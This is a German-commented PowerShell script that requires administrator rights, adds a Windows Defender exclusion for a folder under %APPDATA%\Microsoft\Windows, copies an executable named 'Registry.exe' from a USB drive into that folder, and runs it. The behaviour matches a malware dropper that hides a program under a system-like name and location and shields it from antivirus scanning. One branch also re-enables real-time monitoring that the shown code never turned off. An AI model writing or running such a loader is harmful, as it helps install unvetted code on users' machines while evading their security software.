# Skript mit Admin-Rechten prüfen
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Bitte als Administrator ausführen!"
    exit
}

# Zielordner dynamisch (aktueller Benutzer)
$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
if (-not (Test-Path $zielOrdner)) {
    Write-Host "Erstelle Zielordner $zielOrdner..."
    New-Item -Path $zielOrdner -ItemType Directory -Force
}



# Defender-Ausnahme hinzufügen
Write-Host "Füge Defender-Ausnahme für $zielOrdner hinzu..."
Add-MpPreference -ExclusionPath $zielOrdner

# Suche USB-Sticks nach Registry.exe
Write-Host "Suche USB-Sticks nach Registry.exe..."
$usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"

$gefunden = $false
foreach ($drive in $usbDrives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
    foreach ($partition in $partitions) {
        $logicalDisks = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass = Win32_LogicalDiskToPartition"
        foreach ($logicalDisk in $logicalDisks) {
            $driveLetter = $logicalDisk.DeviceID + "\"
            $quelleDatei = Join-Path $driveLetter "Registry.exe"
            if (Test-Path $quelleDatei) {
                Write-Host "Registry.exe gefunden auf Laufwerk $driveLetter"
                $zielDatei = Join-Path $zielOrdner "Registry.exe"
                Write-Host "Kopiere Registry.exe nach $zielDatei"
                Copy-Item -Path $quelleDatei -Destination $zielDatei -Force
                $gefunden = $true
                break
            }
        }
        if ($gefunden) { break }
    }
    if ($gefunden) { break }
}

if (-not $gefunden) {
    Write-Warning "Registry.exe auf keinem USB-Stick gefunden."
    # Defender wieder aktivieren, auch wenn nichts gefunden
    Write-Host "Aktiviere Windows Defender Echtzeitschutz wieder..."
    Set-MpPreference -DisableRealtimeMonitoring $false
    exit
}


# Registry.exe ausführen
$ausfuehrPfad = Join-Path $zielOrdner "Registry.exe"
if (Test-Path $ausfuehrPfad) {
    Write-Host "Starte $ausfuehrPfad"
    Start-Process -FilePath $ausfuehrPfad
} else {
    Write-Warning "Datei zum Ausführen nicht gefunden: $ausfuehrPfad"
}
